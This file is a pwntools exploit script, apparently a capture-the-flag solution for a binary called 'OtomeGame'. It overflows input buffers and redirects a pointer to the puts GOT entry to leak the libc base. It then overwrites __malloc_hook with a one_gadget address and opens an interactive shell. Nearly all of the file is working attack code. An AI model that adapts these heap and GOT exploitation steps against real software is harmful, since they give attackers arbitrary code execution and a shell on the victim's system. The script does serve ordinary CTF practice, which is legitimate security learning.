#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
elf = './OtomeGame'
exe = context.binary = ELF(elf, checksec=True)
libc = ELF("./libc.so.6")

def start(argv=[]):
    if args.GDB:
        return gdb.debug([elf] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([elf] + argv)
    
gdbscript = '''
init-pwndbg
break *0x401b53
'''.format(**locals())

# -- Exploit goes here --

io = start()

io.send(b"A" * 0x20)
io.send(b"A" * 0x100)
io.sendline(b"2")
io.sendline(b"3")
io.sendline(b"y")
io.send(b"A" * 0x80)
io.sendline(b"1")
io.send(b"A" * 0x10 + p64(exe.got["puts"]))
io.sendline(b"3")
io.sendline(b"2")
io.sendline(b"3")
io.sendline(b"y")

io.recvuntil(b"makand dan menghabiskan ")
libc.address = int(io.recvuntil(b" ", drop=True)) - libc.sym["puts"]
log.info(f"libc @ 0x{libc.address:x}")
assert libc.address & 0xfff == 0

io.send(b"B" * 0x100)
io.sendline(b"2")
io.sendline(b"3")
io.sendline(b"y")
io.send(b"B" * 0x80)
io.sendline(b"1")
io.send(b"A" * 0x10 + p64(exe.got["puts"]))

io.sendline(b"3")
io.sendline(b"2")
io.sendline(b"3")
io.sendline(b"y")
payload = p64(libc.sym["__malloc_hook"] - 0x18) + p64(0)

# reset bins
for i in range(15):
    payload += p64(libc.sym['main_arena'] + 88 + 16 * i) * 2
assert len(payload) == 0x100, hex(len(payload))

io.send(payload)
io.sendline(b"2")
io.sendline(b"3")
io.sendline(b"y")
io.sendline(p64(libc.address + 0xf03a4) * 0x10)

io.interactive()